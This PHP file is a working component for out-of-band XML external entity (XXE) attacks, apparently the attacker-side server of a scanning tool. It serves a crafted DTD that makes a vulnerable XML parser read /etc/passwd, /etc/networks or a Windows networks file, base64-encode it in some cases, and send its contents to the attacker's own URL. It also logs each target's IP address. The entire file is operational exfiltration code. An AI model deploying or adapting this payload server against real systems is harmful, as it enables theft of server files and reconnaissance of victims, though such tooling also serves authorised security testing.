<?php
/* RewriteRule "^dtd/([a-z0-9]+)/([0-9]+)/([a-f0-9]+)/([a-z0-9]+)\.dtd$" "/xxe_dtd.php?session_id=$1&path_id=$2&hex_param=$3&payload=$4" */
$session_id = isset($_GET["session_id"]) ? $_GET["session_id"] : "";
$path_id = isset($_GET["path_id"]) ? $_GET["path_id"] : "";
$hex_param = isset($_GET["hex_param"]) ? $_GET["hex_param"] : "";
$payload = isset($_GET["payload"]) ? $_GET["payload"] : "";
$ip = $_SERVER["REMOTE_ADDR"];

// Even if URL rewriting protects most of the requests we still have to check parameters format
if (strlen($session_id) != 6) exit();
if (!ctype_alnum($session_id)) exit();
if (!ctype_digit($path_id)) exit();
if (!ctype_xdigit($hex_param)) exit();

include("functions.php");

$payload_num = -1;
// We must use small files because big one won't be sent
switch($payload) {
	case "windows":
		$filename = "c:/windows/system32/drivers/etc/networks";
		$payload_num = 2;
		break;
	case "linux":
		$filename = "/etc/passwd";
		$payload_num = 1;
		break;
	case "linux2":
		$filename = "/etc/networks";
		$payload_num = 0;
		break;
	case "javalin":
		$filename = "/etc/passwd";
		$payload_num = 3;
		break;
	case "javawin":
		$filename = "c:/windows/system32/drivers/etc/networks";
		$payload_num = 4;
		break;
}

$time = time();
$directory = "./xxe_data/$session_id/$path_id/$hex_param/";
if (!is_dir($directory)) mkdir($directory, 0777, true);

// Create an empty file so we can know if the DTD was queried
touch("$directory/$time-$payload_num-$ip.txt");

if (substr($payload, 0, 4) === "java") {
$response = '<!ENTITY % payload SYSTEM "file://'.$filename.'">
<!ENTITY % intern "<!ENTITY trick SYSTEM \''.site_url().'xoxo/'.$session_id.'/'.$path_id.'/'.$hex_param.'/'.$payload_num.'/%payload;\'>">
%intern;';
} else {
$response  = '<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource='.$filename.'">
<!ENTITY % intern "<!ENTITY &#37; trick SYSTEM \''.site_url().'xoxo/'.$session_id.'/'.$path_id.'/'.$hex_param.'/'.$payload_num.'/%payload;\'>">
';
}

header("Content-Type: text/xml");
echo $response;
?>
